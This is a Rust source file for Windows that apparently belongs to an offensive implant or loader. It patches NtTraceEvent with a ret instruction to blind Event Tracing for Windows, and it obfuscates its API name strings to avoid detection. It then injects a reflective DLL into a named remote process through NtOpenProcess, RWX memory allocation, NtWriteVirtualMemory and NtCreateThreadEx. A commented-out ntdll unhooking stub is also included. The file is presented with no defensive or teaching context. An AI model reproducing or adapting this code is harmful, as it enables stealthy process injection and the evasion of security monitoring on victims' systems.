use std::str::Bytes;
use std::thread;
use std::time::Duration;
use std::ptr::null_mut;
use std::ptr::addr_of_mut;
use anyhow::Ok;

use crate::nt_api::{
    NT_OPEN_PROCESS_ADDR, NT_ALLOCATE_VIRTUAL_MEMORY_ADDR, NT_WRITE_VIRTUAL_MEMORY_ADDR,
    NT_CREATE_THREAD_EX_ADDR
};

use ntapi::{
    ntobapi::NtClose,
    ntapi_base::CLIENT_ID,
};
use winapi::{
    shared::ntdef::{
        HANDLE, OBJECT_ATTRIBUTES, PVOID, PCSTR,
    },
    shared::ntstatus::STATUS_SUCCESS,
    shared::basetsd::SIZE_T,
    shared::minwindef::{HMODULE, DWORD},
    um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE, PROCESS_VM_READ, THREAD_ALL_ACCESS,
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, GENERIC_READ,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, SEC_IMAGE, PAGE_READONLY
    },
    um::winbase::CreateFileMappingA,
    um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
    um::fileapi::{CreateFileA, OPEN_EXISTING,},
    um::memoryapi::{MapViewOfFile, FILE_MAP_READ},
    um::libloaderapi::{GetModuleHandleA, GetProcAddress},
    um::tlhelp32::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    },
    um::processthreadsapi::{GetCurrentProcess}
};

use export_resolver::ExportList;



use obfuse::obfuse;

use crate::parse_pe::PeParser;

type NtOpenProcessFn = unsafe extern "system" fn(
    ProcessHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *const (),
    ClientId: *const (),
) -> i32;

type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut std::ffi::c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> i32;

type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut std::ffi::c_void,
    Buffer: *const std::ffi::c_void,
    NumberOfBytesToWrite: usize,
    NumberOfBytesWritten: *mut usize,
) -> i32;

type NtCreateThreadExFn = unsafe extern "system" fn(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *const (),
    ProcessHandle: HANDLE,
    StartAddress: *mut std::ffi::c_void,
    Parameter: *mut std::ffi::c_void,
    CreateSuspended: i32,
    StackZeroBits: usize,
    SizeOfStackCommit: usize,
    SizeOfStackReserve: usize,
    lpBytesBuffer: *mut std::ffi::c_void,
) -> i32;




pub fn patch_etw() -> Result<(), anyhow::Error>
{
    let obfused_ntdll = obfuse!("ntdll.dll\0");
    let ntdll_str = obfused_ntdll.as_str();

    let obfused_nt_trace_event = obfuse!("NtTraceEvent\0");
    let nt_trace_event_str = obfused_nt_trace_event.as_str();

    let mut exports = ExportList::new();
    exports.add(ntdll_str, nt_trace_event_str).expect("[ERROR] Finding address of NTTE.");

    let nt_trace_addr = exports.get_function_address(nt_trace_event_str).expect("[ERROR] Unable to retrieve address of NTTE.") as * const c_void;
    let handle = unsafe {
        GetCurrentProcess()
    };

    let ret_opcode: u8 = 0xC3; // ret
    let size = mem::size_of_val(&ret_opcode);
    let mut bytes_written: usize = 0;

    let res = unsafe {

        let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(NT_WRITE_VIRTUAL_MEMORY_ADDR.get().expect("[ERROR] NT_WRITE_VIRTUAL_MEMORY_ADDR not initialized."));

        nt_write_virtual_memory(
            handle,
            nt_trace_addr as *mut std::ffi::c_void,
            &ret_opcode as *const u8 as *const std::ffi::c_void,
            size,
            &mut bytes_written as *mut usize,
        )
    };

    if res != STATUS_SUCCESS || bytes_written != size {
        eprintln!("[ERROR] Failed to patch ETW: 0x{:X}.", res);
    } else {
        println!("[INFO] Successfully patched ETW.");
    }

    Ok(())

}

// fn ntdll_unhook() -> HMODULE {
//     let obfused_ntdll = obfuse!("C:\\Windows\\System32\\ntdll.dll\0");
//     let ntdll_str = obfused_ntdll.as_str();

//     let file = unsafe {
//         CreateFileA(
//             PCSTR(ntdll_str.as_ptr()),
//             GENERIC_READ,
//             FILE_SHARE_READ,
//             null_mut(),
//             OPEN_EXISTING,
//             FILE_ATTRIBUTE_NORMAL,
//             std::ptr::null_mut(),
//         )?
//     };

//     let mapping = unsafe {
//         CreateFileMappingA(
//             file,
//             None,
//             PAGE_READONLY | SEC_IMAGE,
//             0,
//             0,
//             None,
//         )?
//     };

//     let mapped = unsafe {
//         MapViewOfFile(
//             mapping,
//             FILE_MAP_READ,
//             0,
//             0,
//             0,
//         )
//     };

//     unsafe {
//         CloseHandle(file);
//         CloseHandle(mapping);
//     }

//     let h_module = HMODULE(view.0 as _);


// }



pub fn get_process_pid_by_name(target_name_wide: &[u16]) -> Option<u32> {

    let target_name_lowercase = String::from_utf16_lossy(target_name_wide).to_lowercase();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            eprintln!("[ERROR] process snapshot.");
            return None;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as DWORD;

        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                let exe_file_lowercase = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_lowercase();

                if exe_file_lowercase == target_name_lowercase {
                    let _ = CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }

                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        } else {
            eprintln!("[ERROR] first process.");
        }

        let _ = CloseHandle(snapshot);
    }

    None    

}


pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo: usize) -> anyhow::Result<()> {

    // let pid = get_process_pid_by_name(target_name_wide)
    //     .ok_or_else(|| anyhow::anyhow!("Process not found"))?;

    let pid = get_process_pid_by_name(target_name_wide)
        .ok_or_else( || anyhow::anyhow!("[ERROR] Process not found.") )?;

    println!("[INFO] Found pid: {}.", pid);


    let obfused_ntdll = obfuse!("ntdll.dll\0");
    let ntdll_str = obfused_ntdll.as_str();
    let ntdll = unsafe {
        GetModuleHandleA(ntdll_str.as_ptr() as PCSTR)
    };
    unsafe 
    {

        let obfused_ntallocatevirtualmemory = obfuse!("NtAllocateVirtualMemory\0");
        let ntallocatevirtualmemory_str = obfused_ntallocatevirtualmemory.as_str();

        let ntallocatevirtualmemory_addr = GetProcAddress(ntdll, ntallocatevirtualmemory_str.as_ptr() as PCSTR);

        let obfused_ntopenprocess = obfuse!("NtOpenProcess\0");
        let ntopenprocess_str = obfused_ntopenprocess.as_str();

        let ntopenprocess_addr = GetProcAddress(ntdll, ntopenprocess_str.as_ptr() as PCSTR);

        let obfused_ntwritevirtualmemory = obfuse!("NtWriteVirtualMemory\0");
        let ntwritevirtualmemory_str = obfused_ntwritevirtualmemory.as_str();

        let ntwritevirtualmemory_addr = GetProcAddress(ntdll, ntwritevirtualmemory_str.as_ptr() as PCSTR);

        let obfused_ntcreatethreadex = obfuse!("NtCreateThreadEx\0");
        let ntcreatethreadex_str = obfused_ntcreatethreadex.as_str();

        let ntcreatethreadex_addr = GetProcAddress(ntdll, ntcreatethreadex_str.as_ptr() as PCSTR);


        for _i in 1..=5 {
            thread::sleep(Duration::from_secs(1));
        }

        let mut process_handle: HANDLE = null_mut();
        let client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: 0 as _,
        };

        let object_attributes = OBJECT_ATTRIBUTES {
            Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            RootDirectory: null_mut(),
            ObjectName: null_mut(),
            Attributes: 0,
            SecurityDescriptor: null_mut(),
            SecurityQualityOfService: null_mut(),
        }; 

        let desired_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE;

        let nt_open_process: NtOpenProcessFn = std::mem::transmute(ntopenprocess_addr);
        let status = nt_open_process(
            &mut process_handle,
            desired_access,
            &object_attributes as *const OBJECT_ATTRIBUTES as *const (),
            &client_id as *const CLIENT_ID as *const (),
        );

        if status != STATUS_SUCCESS {
            return Err(anyhow::anyhow!("[ERROR] Failed to open proc: 0x{:X}.", status));
        }

        let dll_data = &rf_dll.data;
        let mut base_address: PVOID = null_mut();
        let mut region_size: SIZE_T = dll_data.len() as SIZE_T;

        let nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn = std::mem::transmute(ntallocatevirtualmemory_addr);
        let status = nt_allocate_virtual_memory(
            process_handle,
            addr_of_mut!(base_address) as *mut *mut std::ffi::c_void,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        ); 

        if status != STATUS_SUCCESS || base_address.is_null() {
            NtClose(process_handle);
            return Err(anyhow::anyhow!("[ERROR] Failed to allocate memory in target process: 0x{:X}.", status));
        }

        println!("[INFO] Allocated remote memory at address: 0x{:X}.", base_address as usize);


        let mut bytes_written: SIZE_T = 0;

        let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(ntwritevirtualmemory_addr);
        let status = nt_write_virtual_memory(
            process_handle,
            base_address as *mut std::ffi::c_void,
            dll_data.as_ptr() as *const std::ffi::c_void,
            dll_data.len() as usize,
            &mut bytes_written,
        );

        if status != STATUS_SUCCESS || bytes_written != dll_data.len() {
            NtClose(process_handle);
            return Err(anyhow::anyhow!("[ERROR] Failed to write DLL data to target process: 0x{:X}.", status));
        }

        let mut thread_handle: HANDLE = null_mut();
        let start_address = (base_address as usize + yolo) as *mut std::ffi::c_void;

        let nt_create_thread_ex: NtCreateThreadExFn = std::mem::transmute(ntcreatethreadex_addr);
        let status = nt_create_thread_ex(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            null_mut(),
            process_handle,
            start_address,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        );

        if status != STATUS_SUCCESS {
            NtClose(process_handle);
            return Err(anyhow::anyhow!("[ERROR] Failed to create remote thread: 0x{:X}.", status));
        }

        NtClose(thread_handle);
        NtClose(process_handle);

    }





    Ok(())
}